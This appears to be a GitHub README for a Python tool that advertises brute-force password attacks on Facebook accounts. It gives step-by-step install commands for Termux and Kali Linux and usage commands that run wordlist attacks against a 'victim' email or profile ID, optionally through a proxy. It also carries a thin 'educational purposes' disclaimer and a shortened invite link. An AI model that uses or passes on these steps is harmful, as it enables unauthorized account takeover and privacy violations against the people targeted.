# Facebook_hack

![PicsArt_22-06-08_16-34-50-148](https://user-images.githubusercontent.com/70594016/172602116-20012d77-f4c2-45a6-a5fb-391f683c0f05.png)
###### Powerfull Facebook Bruteforce Attack.
***
### <p align="center">Commands to run tool in ur terminal Termux && Kali Linux
***

 ```bash
Note : Tool is Made of Educational Purposes only.
       Please try not to harm anyone device 
       it's For Fun Purpose Not For Revenge
       (Join Us https://bit.ly/3PV3S3r)
```
## Language is used to Make this tool
- Python
  
## The Tool is for :
- Windows
- Kali Linux
- Android~Termux
- macOs
- any Os has python(2.x, 3.x) with required modules

###### Installation
```bash
apt update && apt upgrade -y
```
```bash
apt install git -y
```
```bash
git clone https://github.com/hackerxphantom/Facebook_hack.git
```
```bash
cd Facebook_hack
```
```bash
pip install requirements.txt
```
```bash
python facebook_hack.py
```

## usage :-
  - **U can Use Victim email Or Facebook Profile Id**:
  
  - **Brute Force On Facebook Account Without proxy**:
  
  * **Command**: python facebook_hack.py -t victim@gmail.com -w 10MPASS.txt
  
  - **Brute Force On Facebook Account With Proxy**:
   
    * **Command**: python facebook_hack.py -t victim@gmail.com -w 10MPASS.txt -p 144.217.101.245:3129
    
    - **Get Target Facebook Profile ID**:
  
   
    * **Command**: python facebook_hack.py -g https://www.facebook.com/zuck
  
